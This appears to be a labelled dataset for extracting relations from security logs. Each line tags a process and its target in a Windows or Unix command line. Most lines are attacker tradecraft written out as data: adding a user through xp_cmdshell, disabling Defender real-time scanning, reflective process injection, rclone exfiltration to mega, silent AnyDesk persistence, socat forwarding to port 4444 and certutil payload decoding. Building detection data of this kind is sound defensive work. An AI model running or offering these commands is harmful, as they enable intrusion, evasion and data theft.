process-process-fork(e1,e2)	"VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC master..xp\_cmdshell <e1>'net</e1> user <e2>sqlbackup</e2> Password!1221! /add'"""
process-file-write(e1,e2)	cmd.exe /C <e1>echo</e1> -------- >> <e2>C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1</e2>
process-socket-receive(e1,e2)	<e1><num>.exe</e1> -access-token <token> -v -p <e2>\\<hostname>\scans</e2>
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /c <e2>rmdir</e2> /S /Q ""C:\Users\REDACTED\EmailStorage_REDACTED-REDACTED_REDACTED"""
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableScanOnRealtimeEnable"" /t REG\_DWORD /d ""1"" /f"
process-process-fork(e1,e2)	svchost.exe <e1>powershell</e1> Start-Process <e2>rundll32.exe</e2>
process-file-read(e1,e2)	"<e1>rundll32.exe</e1> ""C:\Users\USERNAME\AppData\Local\Temp\skull-x64.dat"",update <e2>/i:""DwarfWing\license.dat""</e2>"
process-socket-send(e1,e2)	<e1>WMIC</e1> <e2>/Node:localhost</e2> /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:Listc
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>wmic.exe</e1> process call create <e2>'regsvr32</e2> -s C:\Users\Public\microsoft.security'
process-file-unlink(e1,e2)	cmd.exe <e1>del</e1> <e2>/var/tmp/hide.so</e2>
process-file-chmod(e1,e2)	cmd.exe <e1>attrib</e1> +s +h <e2>/usr/local/bin/backdoor</e2>
process-file-read(e1,e2)	"<e1>rclone.exe</e1> copy <e2>""\\SERVER.domain.name\path""</e2> mega:2 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6"
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /C python.exe <e2>cradle.py</e2>
process-file-write(e1,e2)	cmd.exe /c <e1>C:\ProgramData\AnyDesk.exe</e1> --install <e2>C:\ProgramData\Any</e2> --start-with-win --silent
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>icacls</e2> /tmp/malware.sh /grant Everyone:F
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>net</e2> time
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 C:\ProgramData\updater.exe
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>rm</e2> /usr/local/bin/backdoor
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>nltest</e2> /dclist:DOMAIN.local
process-socket-send(e1,e2)	<e1>psexec.exe</e1> -accepteula -d -s <e2>\\<INTERNAL_IP></e2> rundll32.exe C:\windows\192145.dll,StartW
process-socket-send(e1,e2)	svchost.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>10.10.10.10:4444</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>certutil</e2> -decode %USERPROFILE%\AppData\bigfile.txt %USERPROFILE%\AppData\bigfile.exe
